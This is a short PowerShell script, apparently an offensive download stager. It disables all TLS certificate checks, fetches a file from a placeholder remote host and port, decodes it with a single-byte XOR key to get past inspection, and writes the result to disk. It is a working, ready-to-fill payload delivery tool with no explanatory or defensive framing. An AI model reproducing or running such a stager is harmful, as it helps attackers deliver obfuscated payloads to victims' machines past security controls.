add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$FILENAME = "<FILENAME>"
$RHOST = "<HOST>"
$PORT = "<PORT>"
$ENDPOINT = "xoxo"
$URL = "https://"+$RHOST+":"+$PORT+"/"+$ENDPOINT+"/"+$FILENAME
$KEY = 0x88

function xoxo {
    param($content)

    $retval = $(for ($i = 0; $i -lt $content.length; $i++) {
        $content[$i] -bxor $KEY
    })

    return $retval
}

$content = (Invoke-WebRequest -Uri $URL -UseBasicParsing).Content
$final = xoxo $content

[System.IO.File]::WriteAllBytes(".\"+$FILENAME, $final)
